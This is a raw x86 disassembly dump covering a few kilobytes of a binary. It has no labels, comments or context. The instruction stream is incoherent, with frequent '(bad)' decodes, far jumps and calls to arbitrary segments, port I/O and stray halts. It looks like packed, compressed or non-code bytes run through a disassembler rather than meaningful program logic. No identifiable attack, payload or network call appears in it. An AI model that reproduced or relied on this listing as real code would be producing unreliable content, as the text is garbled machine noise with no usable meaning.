  426c41:	add    DWORD PTR [eax],eax
  426c43:	out    0x1,eax
  426c45:	add    BYTE PTR [eax],al
  426c47:	in     al,dx
  426c48:	and    eax,0xbcd540f
  426c4d:	inc    edx
  426c4e:	push   edx
  426c4f:	repnz mov DWORD PTR ds:[edi-0x6b7386f],esi
  426c57:	and    BYTE PTR [edi],bl
  426c59:	sbb    eax,0x5d4bfdd5
  426c5e:	xor    al,BYTE PTR [ebx]
  426c60:	gs addr16 sub sp,dx
  426c65:	push   ds
  426c66:	lahf   
  426c67:	popa   
  426c68:	in     eax,0xbe
  426c6a:	mov    DWORD PTR [esi+0xd4d25d4],ebx
  426c70:	aaa    
  426c71:	fcomp  QWORD PTR [ecx+ebp*4]
  426c74:	pop    esi
  426c75:	hlt    
  426c76:	push   es
  426c77:	imul   edi,DWORD PTR [edx],0xd76ed6e8
  426c7d:	mov    al,ds:0x55fd145c
  426c82:	icebp  
  426c83:	rcl    DWORD PTR [ecx+ebp*1],0xd6
  426c87:	push   esp
  426c88:	sub    BYTE PTR [edi+esi*4-0x79ef6991],bl
  426c8f:	(bad)  
  426c90:	hlt    
  426c91:	sub    DWORD PTR [esp+edi*1],edx
  426c94:	jnp    0x426cbd
  426c96:	jbe    0x426c25
  426c98:	or     al,0x92
  426c9a:	add    dl,BYTE PTR [ebx-0x45]
  426c9d:	ror    DWORD PTR fs:[ebx],1
  426ca0:	add    al,dl
  426ca2:	sub    edi,DWORD PTR [ebx]
  426ca4:	daa    
  426ca5:	mov    DWORD PTR [eax+0x36],edx
  426ca8:	ja     0x426cf1
  426caa:	rcl    BYTE PTR [edx+0x7c1f1928],cl
  426cb0:	stos   BYTE PTR es:[edi],al
  426cb1:	mov    ?,WORD PTR ds:0x706898fa
  426cb7:	mov    dh,BYTE PTR [eax+0x1c0fe396]
  426cbd:	sahf   
  426cbe:	out    dx,al
  426cbf:	jecxz  0x426c74
  426cc1:	mov    al,0xd3
  426cc4:	cwde   
  426cc5:	mov    ds,WORD PTR [ecx-0x40]
  426cc8:	loope  0x426d1a
  426cca:	cmp    DWORD PTR [edi-0x7ee9cf9d],ebp
  426cd0:	sti    
  426cd1:	es or  dl,al
  426cd4:	or     eax,0x457d35d0
  426cd9:	pop    ebp
  426cda:	push   ss
  426cdb:	adc    DWORD PTR [esi],eax
  426cdd:	test   eax,0xf5a75c07
  426ce2:	inc    esp
  426ce3:	adc    al,0xc5
  426ce5:	push   ebp
  426ce6:	stos   DWORD PTR es:[edi],eax
  426ce7:	imul   esp,ebx,0x27
  426cea:	div    dh
  426cec:	or     ebp,DWORD PTR [edx]
  426cee:	pop    ebp
  426cef:	loope  0x426cd8
  426cf1:	xchg   esp,eax
  426cf2:	out    0xc1,eax
  426cf4:	bound  ecx,QWORD PTR [ecx-0x2e61c80f]
  426cfa:	leave  
  426cfb:	mov    edx,DWORD PTR [eax-0x5d]
  426cfe:	loop   0x426cec
  426d00:	jno    0x426cf1
  426d02:	and    edx,eax
  426d04:	inc    edx
  426d05:	mov    edx,0x94ec67f2
  426d0a:	fmul   DWORD PTR [eax+0x5c]
  426d0d:	inc    edx
  426d0e:	adc    eax,0xd305b101
  426d13:	icebp  
  426d14:	xchg   edx,eax
  426d15:	or     eax,0x390eef1d
  426d1a:	in     al,dx
  426d1b:	push   es
  426d1c:	pusha  
  426d1d:	inc    edx
  426d1e:	loop   0x426d60
  426d20:	adc    dh,BYTE PTR [eax]
  426d22:	mov    DWORD PTR [ebx+0x56],edi
  426d25:	jbe    0x426cc1
  426d27:	and    al,0xd1
  426d29:	add    al,0xff
  426d2b:	push   0xfffffff0
  426d2d:	jns    0x426d17
  426d2f:	aas    
  426d30:	mov    eax,ds:0xde394aa2
  426d35:	jp     0x426d96
  426d37:	out    dx,eax
  426d38:	mov    eax,0x94dc79ef
  426d3d:	aam    0x70
  426d3f:	pop    ss
  426d40:	jno    0x426db4
  426d42:	cdq    
  426d43:	cmp    al,0x1
  426d45:	jmp    0x3c70e116
  426d4a:	mov    BYTE PTR [ebp-0x44],0x2a
  426d4e:	fild   QWORD PTR [eax+0x35]
  426d51:	cmp    cl,al
  426d53:	jmp    0x426d18
  426d55:	pop    es
  426d56:	push   eax
  426d57:	cmp    BYTE PTR [edi+edx*4+0x1a],ch
  426d5b:	jecxz  0x426dd4
  426d5d:	lds    ebp,FWORD PTR [eax]
  426d5f:	jnp    0x426d96
  426d61:	push   ebp
  426d63:	jnp    0x426ceb
  426d65:	mov    bl,0x9d
  426d67:	mov    dl,0x43
  426d69:	inc    esi
  426d6a:	inc    esi
  426d6b:	int3   
  426d6c:	mov    bh,0x80
  426d6e:	sbb    ah,BYTE PTR [eax]
  426d70:	rcr    dh,1
  426d72:	lds    ebp,FWORD PTR ss:[ecx]
  426d75:	sub    ebx,DWORD PTR [ebx]
  426d77:	out    dx,eax
  426d78:	leave  
  426d79:	jmp    0x12c7:0x79e6e2d
  426d80:	pusha  
  426d81:	icebp  
  426d82:	mov    bh,0xb8
  426d84:	sbb    BYTE PTR [ecx],0x8c
  426d87:	mov    ?,WORD PTR [esi]
  426d89:	pop    edi
  426d8a:	lahf   
  426d8b:	cwde   
  426d8c:	xlat   BYTE PTR gs:[ebx]
  426d8e:	add    BYTE PTR [ecx-0x78],dl
  426d91:	mov    esi,0xb0f6d973
  426d96:	mov    eax,ds:0xd1ddc69c
  426d9b:	mov    ebp,0xdaa2d8f3
  426da0:	or     ah,dh
  426da2:	and    al,0x62
  426da4:	in     eax,0x83
  426da6:	mov    al,ds:0x60611184
  426dab:	inc    ebp
  426dac:	jne    0x426d3a
  426dae:	xchg   DWORD PTR [esi+0x47],ecx
  426db1:	push   ds
  426db2:	int    0xe1
  426db4:	mov    esi,0x768894aa
  426db9:	sub    BYTE PTR [ebx+0x61],al
  426dbc:	jg     0x426db6
  426dbe:	or     eax,0xf22bb0da
  426dc3:	pop    ds
  426dc4:	adc    DWORD PTR [edx-0x26],0xcfbed1cd
  426dcb:	fisttp DWORD PTR [ebx-0x21]
  426dce:	jge    0x426d6e
  426dd0:	jecxz  0x426d57
  426dd2:	clc    
  426dd3:	mov    dh,0x4f
  426dd5:	inc    edx
  426dd6:	push   es
  426dd7:	cwde   
  426dd8:	sahf   
  426dd9:	jle    0x426dc5
  426ddb:	ja     0x426d71
  426ddd:	inc    ecx
  426dde:	into   
  426ddf:	scas   eax,DWORD PTR es:[edi]
  426de0:	pusha  
  426de1:	adc    al,BYTE PTR [esi]
  426de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426de4:	jmp    0x426d69
  426de6:	sub    ebp,DWORD PTR [ecx-0x28]
  426de9:	lock inc esp
  426deb:	aad    0xf9
  426ded:	bound  eax,QWORD PTR [edi]
  426def:	enter  0xe530,0x32
  426df3:	std    
  426df4:	jle    0x426e58
  426df6:	call   0x502b:0x66726db1
  426dfd:	mov    edi,0xbe46ab81
  426e02:	das    
  426e03:	adc    BYTE PTR [edx],al
  426e05:	and    esp,edx
  426e07:	shl    BYTE PTR [ecx-0x55af4f92],0x13
  426e0e:	sbb    ch,BYTE PTR [edi]
  426e10:	mov    cs,WORD PTR [ecx-0x39837557]
  426e16:	call   0x810a:0x2f5a44ca
  426e1d:	inc    edx
  426e1e:	sbb    dh,BYTE PTR gs:[edx]
  426e21:	jne    0x426e4d
  426e23:	and    BYTE PTR [eax],al
  426e25:	xchg   esp,eax
  426e26:	add    dh,BYTE PTR [ebx]
  426e28:	imul   ebx,DWORD PTR [edx],0xffffffd4
  426e2b:	jl     0x519c6e78
  426e31:	leave  
  426e32:	popf   
  426e33:	retf   
  426e34:	popf   
  426e35:	pop    esi
  426e36:	xlat   BYTE PTR ds:[ebx]
  426e37:	aaa    
  426e38:	add    bl,ch
  426e3a:	arpl   bx,sp
  426e3c:	cmp    DWORD PTR [ebp-0x2b],ecx
  426e3f:	ret    
  426e40:	in     eax,0x1
  426e42:	add    bh,ah
  426e44:	add    DWORD PTR [eax],eax
  426e46:	add    BYTE PTR [edi+0x61764e54],dh
  426e4c:	dec    ecx
  426e4d:	sub    dl,al
  426e4f:	mov    al,0x2e
  426e51:	mov    ds:0x72867665,al
  426e56:	cmp    eax,0x4206e074
  426e5c:	mov    bh,0xe0
  426e5e:	je     0x426e85
  426e60:	add    eax,0xd0f1d4e8
  426e65:	inc    esi
  426e66:	call   0x7eb4:0x1ef51c4d
  426e6d:	inc    esi
  426e6e:	pop    esp
  426e6f:	(bad)  
  426e70:	arpl   WORD PTR [eax+0x27],ax
  426e73:	lods   al,BYTE PTR ds:[esi]
  426e74:	sbb    esp,esi
  426e76:	xor    cl,BYTE PTR [ebx-0x41533b3b]
  426e7c:	xor    bl,BYTE PTR [edi+0x4a]
  426e7f:	xchg   DWORD PTR [ebx+0x15d14640],ecx
  426e85:	enter  0xe539,0xa7
  426e89:	xor    BYTE PTR [ebp+0x49ae8871],dh
  426e8f:	add    eax,0xb0bf1da2
  426e94:	lahf   
  426e95:	lods   eax,DWORD PTR ds:[esi]
  426e96:	pop    ebx
  426e97:	mov    ch,0xb8
  426e99:	out    0xb0,eax
  426e9b:	test   al,0x75
  426e9d:	add    DWORD PTR [ebx-0x68],edi
  426ea0:	inc    edx
  426ea1:	mov    bh,0xa8
  426ea3:	bound  ebx,QWORD PTR [ebx+eiz*8+0x52]
  426ea7:	mov    esp,0x1d137982
  426eac:	inc    edi
  426ead:	in     eax,0x5d
  426eaf:	push   cs
  426eb0:	push   edx
  426eb1:	idiv   BYTE PTR [esi+0x2cead310]
  426eb7:	lods   al,BYTE PTR ds:[esi]
  426eb8:	pusha  
  426eb9:	out    dx,eax
  426eba:	xor    DWORD PTR [esi-0x3d42f39f],esi
  426ec0:	aas    
  426ec1:	ss hlt 
  426ec3:	cmp    BYTE PTR [edx-0x2827e515],0x21
  426eca:	mov    ah,0xa5
  426ecc:	fist   DWORD PTR [edx+ebx*2-0x45]
  426ed0:	bound  eax,QWORD PTR [edi]
  426ed2:	out    dx,al
  426ed3:	out    0x7a,al
  426ed5:	es daa 
  426ed7:	sub    DWORD PTR [esi-0x47],ebx
  426eda:	xchg   esp,eax
  426edb:	mov    DWORD PTR [edi],0xe8fc246c
  426ee1:	lahf   
  426ee2:	pop    esp
  426ee3:	clc    
  426ee4:	jo     0x426ee7
  426ee6:	fcom   DWORD PTR fs:[edx+0x4c679a18]
  426eed:	sub    bl,dl
  426eef:	stos   BYTE PTR es:[edi],al
  426ef0:	push   0x18
  426ef2:	lahf   
  426ef3:	inc    ebp
  426ef4:	or     ah,0x7f
  426ef7:	sbb    eax,0x6f066776
  426efc:	pop    eax
  426efd:	sbb    al,BYTE PTR [eax-0x5f7840d4]
  426f03:	ffreep st(7)
  426f05:	mov    bl,0x9c
  426f07:	in     eax,0xc3
  426f09:	and    DWORD PTR [ebx+0x1],ecx
  426f0c:	and    DWORD PTR [ebx+0x54],ebx
  426f0f:	lds    edi,FWORD PTR [ecx+ebx*4-0x2956b1ed]
  426f16:	add    ebp,edx
  426f18:	jo     0x426f02
  426f1a:	inc    ebp
  426f1b:	clc    
  426f1c:	sbb    dh,dl
  426f1e:	cmp    al,0xef
  426f20:	pop    ebx
  426f21:	jmp    0x95c8:0x9c2555a4
  426f28:	fiadd  DWORD PTR [ebx]
  426f2a:	jb     0x426f66
  426f2c:	bound  edx,QWORD PTR [ecx]
  426f2e:	xchg   esp,eax
  426f2f:	aas    
  426f30:	scas   eax,DWORD PTR es:[edi]
  426f31:	mov    es,WORD PTR [edi-0x6078ade5]
  426f37:	push   esp
  426f38:	jns    0x426f37
  426f3a:	xchg   esp,eax
  426f3b:	icebp  
  426f3c:	lahf   
  426f3d:	test   al,0x1a
  426f3f:	dec    esp
  426f40:	outs   dx,BYTE PTR ds:[esi]
  426f41:	or     DWORD PTR [edx],ecx
  426f43:	into   
  426f44:	je     0x426f0e
  426f46:	adc    BYTE PTR [edi-0x8efd253],0xa8
  426f4d:	push   esp
  426f4e:	fcmovbe st,st(1)
  426f50:	clc    
  426f51:	pop    ebx
  426f52:	push   esp
  426f53:	sti    
  426f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f55:	jle    0x426fca
  426f57:	and    eax,0xa27d086d
  426f5c:	sub    eax,0xeb6bb5cc
  426f61:	xor    ah,BYTE PTR [edi]
  426f63:	or     BYTE PTR [edi+ebp*4],dl
  426f66:	pop    ds
  426f67:	pop    ebp
  426f68:	xlat   BYTE PTR ds:[ebx]
  426f69:	loopne 0x426fe4
  426f6b:	jnp    0x426f21
  426f6d:	cmp    eax,0x71eb4b33
  426f72:	fcomip st,st(1)
  426f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f75:	add    al,0xbf
  426f77:	in     al,dx
  426f78:	cmc    
  426f79:	mov    edi,0xa129b67a
  426f7e:	dec    ebx
  426f7f:	pop    ebx
  426f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f81:	(bad)  
  426f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f83:	loope  0x426f35
  426f85:	test   al,0xd
  426f87:	sub    al,0x7c
  426f89:	(bad)  
  426f8a:	sbb    al,0x35
  426f8c:	dec    esi
  426f8d:	mov    bl,0xde
  426f8f:	imul   edi,DWORD PTR [edi+0x715e635d],0xa748a7f8
  426f99:	cmp    dl,BYTE PTR [edi]
  426f9b:	pop    ss
  426f9c:	xor    cl,BYTE PTR [edx]
  426f9e:	out    dx,eax
  426f9f:	xchg   esi,eax
  426fa0:	cs dec edx
  426fa2:	pusha  
  426fa3:	(bad)  
  426fa4:	push   esp
  426fa5:	jo     0x426f89
  426fa7:	mov    al,ds:0x991da190
  426fac:	pop    edx
  426fad:	outs   dx,DWORD PTR ds:[esi]
  426fae:	mov    al,ds:0xb94b7a35
  426fb3:	sbb    al,0x31
  426fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fb6:	shl    BYTE PTR [ebx-0x23],cl
  426fb9:	push   ecx
  426fba:	sbb    al,0x35
  426fbc:	jo     0x427014
  426fbe:	in     al,dx
  426fbf:	mov    al,0xbc
  426fc1:	add    ebp,DWORD PTR [ebx-0x55257f3a]
  426fc7:	cld    
  426fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fc9:	cmc    
  426fca:	inc    ecx
  426fcb:	aaa    
  426fcc:	sbb    al,0xcc
  426fce:	inc    ebx
  426fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd0:	daa    
  426fd1:	push   ebp
  426fd2:	call   0x97b6:0xd8ccb542
  426fd9:	xchg   edx,eax
  426fda:	out    0xcb,eax
  426fdc:	ficomp WORD PTR [edx+edx*1+0x57]
  426fe0:	fidivr DWORD PTR [edx+0x63]
  426fe3:	jb     0x426fb0
  426fe5:	bound  eax,QWORD PTR [esi]
  426fe7:	push   esp
  426fe8:	pop    esp
  426fe9:	push   ebx
  426fea:	sbb    edi,DWORD PTR [edi]
  426fec:	jp     0x426f7e
  426fee:	add    ecx,ebx
  426ff0:	out    0x53,eax
  426ff2:	xchg   BYTE PTR [ecx-0x7],al
  426ff5:	pop    es
  426ff6:	mov    BYTE PTR [esi-0x16],ah
  426ff9:	jne    0x427015
  426ffb:	cwde   
  426ffc:	or     al,0x51
  426ffe:	add    ecx,DWORD PTR [ebx-0x57]
  427001:	imul   ecx,DWORD PTR [ecx-0x31],0x24
  427005:	bound  ebp,QWORD PTR [ecx+0x704097f3]
  42700b:	(bad)  
  42700c:	lods   al,BYTE PTR gs:[esi]
  42700e:	dec    ebx
  42700f:	pusha  
  427010:	pop    ds
  427011:	call   0x4bef:0x56c604d1
  427018:	popa   
  427019:	cmp    BYTE PTR [esi+0x608d0549],cl
  42701f:	sub    al,0x39
  427021:	push   ecx
  427022:	jnp    0x426ff4
  427024:	ins    DWORD PTR es:[edi],dx
  427025:	repz repz mov ebx,0x1369eeed
  42702c:	inc    ebx
  42702d:	je     0x42702f
  42702f:	sbb    ch,al
  427031:	mov    ebx,esp
  427033:	sti    
  427034:	call   FWORD PTR [edi-0x12]
  427037:	and    ebp,DWORD PTR [ebx-0x1ccaa5e5]
  42703d:	aaa    
  42703e:	mov    edi,0x1e7aa
  427043:	out    0x1,eax
  427045:	add    BYTE PTR [eax],al
  427047:	lods   eax,DWORD PTR ds:[esi]
  427048:	aad    0x9f
  42704a:	pop    ebx
  42704b:	std    
  42704c:	push   0x77
  42704e:	add    BYTE PTR [eax+ecx*4],0x39
  427052:	and    ebx,0xffffff8d
  427055:	fwait
  427056:	and    eax,0x5fa3246a
  42705b:	gs mov edi,0xaaf00d1f
  427061:	mov    esp,0x1e00c410
  427066:	lahf   
  427067:	mov    es,esi
  427069:	add    al,0x9d
  42706b:	int3   
  42706c:	daa    
  42706d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42706e:	aad    0xa7
  427070:	sub    ebx,DWORD PTR [eax+0x4fd12bac]
  427076:	dec    ecx
  427077:	loope  0x4270f3
  427079:	iret   
  42707a:	arpl   sp,dx
  42707c:	stos   DWORD PTR es:[edi],eax
  42707d:	mov    al,0xfa
  42707f:	xchg   DWORD PTR [eax-0x621a387e],eax
  427085:	cwde   
  427086:	lds    esp,FWORD PTR [esi]
  427088:	and    BYTE PTR [ecx+0x35],al
  42708b:	stos   BYTE PTR es:[edi],al
  42708c:	(bad)
  427091:	pop    esi
  427092:	jmp    0x14d1:0xfb202cea
  427099:	pop    ecx
  42709a:	cmp    eax,0x4c9ae5d0
  42709f:	cmp    eax,0xc601e457
  4270a4:	inc    ebx
  4270a5:	cmp    al,0xdd
  4270a7:	mov    al,0xf4
  4270a9:	jg     0x4270e1
  4270ab:	outs   dx,BYTE PTR ds:[esi]
  4270ac:	sub    al,BYTE PTR [edx+0x27d54225]
  4270b2:	in     eax,dx
  4270b3:	pop    ds
  4270b4:	out    0xc0,al
  4270b6:	pop    edi
  4270b7:	stc    
  4270b8:	leave  
  4270b9:	aas    
  4270ba:	out    dx,eax
  4270bb:	gs inc eax
  4270bd:	bound  eax,QWORD PTR [esi+0x31]
  4270c0:	add    DWORD PTR [edx],esp
  4270c2:	out    dx,al
  4270c3:	xor    DWORD PTR [ebx],edi
  4270c5:	adc    ch,ch
  4270c7:	fcomp  QWORD PTR [ebp-0x1b]
  4270ca:	jle    0x4270de
  4270cc:	mov    ds:0xc133ace5,al
  4270d1:	in     eax,dx
  4270d2:	outs   dx,BYTE PTR ds:[esi]
  4270d3:	fsubr  st(3),st
  4270d5:	retf   0xc3b6
  4270d8:	shl    DWORD PTR [ebx+0x31f1a2f1],0x24
  4270df:	jnp    0x4270f0
  4270e1:	adc    cl,dl
  4270e3:	lods   al,BYTE PTR ds:[esi]
  4270e4:	cmp    DWORD PTR [edi+0x4e],ebx
  4270e7:	inc    ebp
  4270e8:	loope  0x427074
  4270ea:	push   0xffffffbe
  4270ec:	mov    bl,0x97
  4270ee:	push   ecx
  4270ef:	xchg   ecx,eax
  4270f0:	popf   
  4270f1:	int3   
  4270f2:	inc    edx
  4270f3:	xchg   ebx,eax
  4270f4:	pushf  
  4270f5:	mov    DWORD PTR [eax-0x66],esp
  4270f8:	stc    
  4270f9:	ret    
  4270fa:	add    al,0x48
  4270fc:	push   ebx
  4270fd:	push   0x1dff0ac6
  427102:	ret    
  427103:	ins    DWORD PTR es:[edi],dx
  427104:	inc    esp
  427105:	ja     0x42714a
  427107:	sahf   
  427108:	test   al,0xab
  42710a:	push   ebx
  42710b:	cmc    
  42710c:	push   0x22
  42710e:	jge    0x4270eb
  427110:	das    
  427111:	neg    BYTE PTR [ebp+edx*8+0xf62b488]
  427118:	fs jmp 0x9966:0xfc99e95f
  427120:	int3   
  427121:	loope  0x42717d
  427123:	enter  0xbe6,0x5f
  427127:	jmp    0x106acaa9
  42712c:	pushf  
  42712d:	and    esp,DWORD PTR [eax]
  42712f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427130:	das    
  427131:	or     esp,DWORD PTR [ebp-0x7d5ecb4]
  427137:	mov    eax,0x6d55b523
  42713c:	repnz mov bh,0xa8
  42713f:	or     eax,0x4e036b8
  427144:	push   ss
  427145:	ret    0xbb8d
  427148:	inc    edx
  427149:	jp     0x4271be
  42714b:	lods   al,BYTE PTR ds:[esi]
  42714c:	aad    0xef
  42714e:	aaa    
  42714f:	jmp    0x4270df
  427151:	mov    al,0x30
  427153:	xchg   DWORD PTR [ebx+edx*2],edi
  427156:	sub    eax,DWORD PTR [ecx-0x16]
  427159:	test   eax,0x6d3b3e15
  42715e:	push   ss
  42715f:	in     eax,0x9b
  427161:	cmp    eax,eax
  427163:	nop
  427164:	cmc    
  427165:	mov    ebx,0xd73cc907
  42716a:	fs pop eax
  42716c:	lods   al,BYTE PTR ds:[esi]
  42716d:	inc    eax
  42716e:	or     bl,bl
  427170:	inc    edx
  427171:	cdq    
  427172:	cmp    DWORD PTR [eax-0x11912380],edi
  427178:	and    al,0x64
  42717a:	mov    edi,0x32fc33f5
  42717f:	sti    
  427180:	arpl   di,cx
  427182:	sub    DWORD PTR [edx+edx*1-0x6093a8a0],0x36f720d3
  42718d:	push   0x66
  42718f:	cmp    bh,BYTE PTR [eax+0x2112e0e3]
  427195:	call   0x5c24:0x3a97d2ae
  42719c:	cwde   
  42719d:	lods   al,BYTE PTR ds:[esi]
  42719e:	push   edx
  42719f:	addr16 in al,0x86
  4271a2:	out    dx,eax
  4271a3:	(bad)  
  4271a4:	out    dx,al
  4271a5:	das    
  4271a6:	jmp    0x427175
  4271a8:	pop    ss
  4271a9:	add    eax,0x39
  4271ac:	jp     0x42713a
  4271ae:	jmp    0x4f1fc1ad
  4271b3:	fwait
  4271b4:	popf   
  4271b5:	push   cs
  4271b6:	in     al,0x6
  4271b8:	xchg   BYTE PTR [eax],ch
  4271ba:	mov    ebp,0xaedbb8fe
  4271bf:	mov    ah,BYTE PTR [edi-0x23c11484]
  4271c5:	xor    al,0x83
  4271c7:	pop    edx
  4271c8:	jns    0x42716e
  4271ca:	loop   0x4271e1
  4271cc:	dec    ebx
  4271cd:	je     0x427172
  4271cf:	std    
  4271d0:	xchg   ecx,eax
  4271d1:	hlt    
  4271d2:	and    esp,DWORD PTR [eax+0x5b8b3871]
  4271d8:	frstor ds:[edx+eax*4+0x4fc6ac2e]
  4271e0:	xchg   esp,eax
  4271e1:	adc    cl,BYTE PTR [eax]
  4271e3:	loop   0x42716f
  4271e5:	cmp    al,ch
  4271e7:	dec    ecx
  4271e8:	xchg   edx,eax
  4271e9:	enter  0xd310,0x45
  4271ed:	stos   BYTE PTR es:[edi],al
  4271ee:	stos   DWORD PTR es:[edi],eax
  4271ef:	fst    QWORD PTR [ecx]
  4271f1:	xchg   ebx,eax
  4271f2:	xchg   edx,eax
  4271f3:	push   ebx
  4271f4:	inc    edx
  4271f5:	sbb    BYTE PTR [ecx],ah
  4271f7:	neg    BYTE PTR [esi-0x1c]
  4271fa:	xor    al,0xcb
  4271fc:	add    al,BYTE PTR [ebx]
  4271fe:	mov    DWORD PTR [edi+edx*4+0x2c],edi
  427202:	jge    0x42720a
  427204:	sbb    DWORD PTR [ebx+0x3fe73840],edx
  42720a:	or     eax,0xd107b22b
  42720f:	hlt    
  427210:	adc    ebx,edx
  427212:	sub    cl,cl
  427214:	js     0x42721a
  427216:	cld    
  427217:	ret    
  427218:	inc    ebp
  427219:	push   ebp
  42721a:	or     ah,BYTE PTR [ebp+0x37ecbc7b]
  427220:	aaa    
  427221:	and    esp,DWORD PTR ds:0x7bc586a
  427227:	int    0x8b
  427229:	(bad)  
  42722a:	shl    DWORD PTR [eax-0x1dff19e8],cl
  427230:	jnp    0x427283
  427232:	data16 fldcw WORD PTR [esi-0x9]
  427236:	dec    ecx
  427238:	imul   edx,DWORD PTR [ecx+0x2a2ed162],0x58
  42723f:	xchg   ecx,eax
  427240:	jmp    0x2297246
  427245:	add    BYTE PTR [eax],al
  427247:	out    dx,al
  427248:	pop    ebp
  427249:	or     al,0xd0
  42724b:	pop    ss
  42724c:	js     0x4272a6
  42724e:	test   eax,0x5fd77285
  427253:	jae    0x4272af
  427255:	fcmovu st,st(6)
  427257:	call   0x2b95:0x2e4c666a
  42725e:	sahf   
  42725f:	pop    edx
  427260:	pop    ebp
  427261:	push   ds
  427262:	push   edi
  427263:	mov    BYTE PTR [edi+0x291928c9],bl
  427269:	add    ecx,DWORD PTR [edi-0x50]
  42726c:	popa   
  42726d:	outs   dx,BYTE PTR ds:[esi]
  42726e:	(bad)  
  42726f:	retf   0x4297
  427272:	mov    DWORD PTR ds:0xf22b47dc,edx
  427278:	push   es
  427279:	mov    al,0x47
  42727b:	dec    esi
  42727c:	mov    WORD PTR [eax],cs
  42727e:	adc    DWORD PTR [ebp-0x4d],ebp
  427281:	stos   DWORD PTR es:[edi],eax
  427282:	jle    0x427290
  427284:	aam    0x3
  427286:	sar    edi,1
  427288:	pop    edi
  427289:	mov    ecx,0x62cbe607
  42728e:	fisttp QWORD PTR [edi-0x76]
  427291:	mov    edx,0x2e525ae5
  427296:	clc    
  427297:	xor    al,0xbd
  427299:	adc    al,0xc6
  42729b:	xor    DWORD PTR [eax+0x68],0xe2ca9ac2
  4272a2:	rcl    al,1
  4272a4:	dec    ebp
  4272a5:	mov    edx,0x12fab0e7
  4272aa:	std    
  4272ab:	das    
  4272ac:	push   esp
  4272ad:	jg     0x427231
  4272af:	imul   BYTE PTR [edx]
  4272b1:	and    eax,DWORD PTR [ecx-0x16]
  4272b4:	jo     0x427323
  4272b6:	mov    bl,0xc6
  4272b8:	pop    eax
  4272b9:	adc    cl,BYTE PTR [esi-0xb]
  4272bc:	ret    
  4272bd:	cmp    ecx,ebp
  4272bf:	lock xor BYTE PTR [esi-0x24f7171],cl
  4272c6:	test   eax,0xc7eaabe8
  4272cb:	pop    esi
  4272cc:	mov    ebp,DWORD PTR [ebp+ebp*2-0x7274b3b9]
  4272d3:	adc    DWORD PTR [ebp-0x7d],0x6e
  4272d7:	mov    ch,0xc3
  4272d9:	int    0xfc
  4272db:	or     esi,DWORD PTR [edx]
  4272dd:	enter  0x9e91,0x70
  4272e1:	les    ebp,FWORD PTR [eax-0x63]
  4272e4:	es repz sbb ah,0x5b
  4272e9:	and    cl,BYTE PTR [eax*2+0x6b6157c8]
  4272f0:	inc    ecx
  4272f1:	jne    0x427280
  4272f3:	pop    ss
  4272f4:	add    al,0xbc
  4272f6:	lea    esp,[ecx+0x4a3fd719]
  4272fc:	pop    esp
  4272fd:	(bad)  
  4272fe:	in     al,0x76
  427300:	je     0x4272c1
  427302:	nop
  427303:	popf   
  427304:	xchg   ecx,eax
  427305:	pop    esp
  427306:	xchg   ecx,eax
  427307:	das    
  427308:	call   0xa5f175c2
  42730d:	mov    ebp,0x927b5cb5
  427312:	cmc    
  427313:	mov    ah,BYTE PTR [esi]
  427315:	outs   dx,DWORD PTR ds:[esi]
  427316:	sub    dh,dh
  427318:	std    
  427319:	or     bl,bh
  42731b:	jbe    0x4272d0
  42731d:	sub    DWORD PTR [eax+edx*2-0x5c],edx
  427321:	sub    bl,BYTE PTR [eax]
  427323:	xchg   esi,eax
  427324:	push   ebx
  427325:	das    
  427326:	and    cl,BYTE PTR [eax-0x971d939]
  42732c:	mov    ebp,0xc6303f31
  427331:	jbe    0x427319
  427333:	mov    ds:0x698f099,al
  427338:	or     BYTE PTR [ebx],ah
  42733a:	repnz call 0xd857:0x444d1fc2
  427342:	and    al,0xb2
  427344:	std    
  427345:	stc    
  427346:	mov    dh,0x87
  427348:	jle    0x4272ee
  42734a:	test   al,0xa4
  42734c:	sub    al,0xcb
  42734e:	stc    
  42734f:	sub    BYTE PTR [edi],dl
  427351:	pop    es
  427352:	pushf  
  427353:	push   ebx
  427354:	lahf   
  427355:	out    0x7f,eax
  427357:	out    0x12,al
  427359:	pop    ebp
  42735a:	inc    ebx
  42735b:	jae    0x4272e0
  42735d:	sbb    edi,DWORD PTR [edi+0x34bcdad1]
  427363:	sbb    eax,0x6b4473b
  427368:	(bad)  
  42736a:	dec    ebp
  42736b:	cwde   
  42736c:	fdivr  st,st(6)
  42736e:	sub    ebp,DWORD PTR [edi+eiz*4+0x6]
  427372:	leave  
  427373:	xchg   eax,esi
  427375:	sbb    DWORD PTR [esi+0x25c27342],ebx
  42737b:	cmp    bh,dh
  42737d:	in     al,0xab
  42737f:	fwait
  427380:	dec    ebp
  427381:	jge    0x427383
  427383:	in     al,0x1a
  427385:	xchg   esi,edi
  427387:	dec    eax
  427388:	popf   
  427389:	add    dl,bl
  42738b:	gs repnz inc esi
  42738e:	nop
  42738f:	xchg   ebp,eax
  427390:	or     dh,BYTE PTR [esi-0x14]
  427393:	inc    ecx
  427394:	retf   
  427395:	scas   al,BYTE PTR es:[edi]
  427396:	sbb    eax,DWORD PTR [esi-0x6c]
  427399:	hlt    
  42739a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42739b:	xchg   ebx,eax
  42739c:	in     eax,0x9b
  42739e:	dec    esp
  42739f:	xchg   BYTE PTR [esi-0x3d],bl
  4273a2:	add    al,0x3e
  4273a4:	lock (bad) 
  4273a6:	popa   
  4273a7:	shl    eax,1
  4273a9:	xchg   edi,eax
  4273aa:	shl    BYTE PTR [edi+0x77fed49e],0x3b
  4273b1:	adc    eax,0xc0451df4
  4273b6:	push   esi
  4273b7:	sub    eax,0x3371346b
  4273bc:	pop    ebp
  4273bd:	mov    ch,0x70
  4273bf:	in     al,0x2f
  4273c1:	inc    edx
  4273c2:	jb     0x427389
  4273c4:	mov    dh,0x92
  4273c6:	sbb    ebp,DWORD PTR [esp+ebx*1]
  4273c9:	ins    BYTE PTR es:[edi],dx
  4273ca:	(bad)  
